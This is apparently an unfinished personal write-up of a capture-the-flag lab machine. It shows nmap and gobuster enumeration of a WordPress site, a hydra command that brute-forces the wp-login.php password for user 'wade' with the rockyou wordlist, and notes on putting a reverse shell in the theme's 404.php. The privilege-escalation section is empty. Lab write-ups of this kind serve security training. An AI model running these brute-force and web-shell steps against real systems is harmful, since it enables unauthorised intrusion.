# 0. Setup

# 1. Recon & Enumration
## 1.1 nmap

```bash
sudo nmap -A -T4 $TGT -Pn -oN nmapOutput.nmap
```

Options explained: -A runs version detection& default scripts, -T4 is the timing template to use (0: slowest, 5: quickest), $TGT is the target IP variable I have set, -Pn dont run host discovery, -oN is used to output the nmap scan results to a file.

**nmap results:**

IMAGE NMAP

Points of interest from nmap results:
- Port 80 open hosting [Werkzeug](https://pypi.org/project/Werkzeug/)

## 1.2 View Website

We can navigate to the website in browser using the target IP `http://<TGTIP>`
IMAGE WEBSITE BLANK

From here I generally browse the website as a user would do (alongside viewing page sources) to get an idea of the websites functionality and purpose before using enumeration tools.

Potential avenues.
home page:
- Contribute image 
- ![](../../ZZ%20-%20Pasted%20Images/Pasted%20image%2020221005064817.png)
- User wade
- Find login page
	- wp-login.php

```bash
gobuster dir -u http://$TGT/retro -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php     
```

http://10.10.43.131/retro/wp-trackback.php?ID=WADE
![](../../ZZ%20-%20Pasted%20Images/Pasted%20image%2020221005065401.png)


# 2. Exploitation
WP password cracking
Password cracking
```
hydra -l wade -P /usr/share/wordlists/rockyou.txt $TGT http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username"
```

# 3. Post Compromise Enumeration

404.php in theme
Windows web server doesnt support uname so can't use pentestmonkey reverse shell



404 page
http://10.10.43.131/retro/index.php/asdasdasdasd

# 4. Privilege Escalation
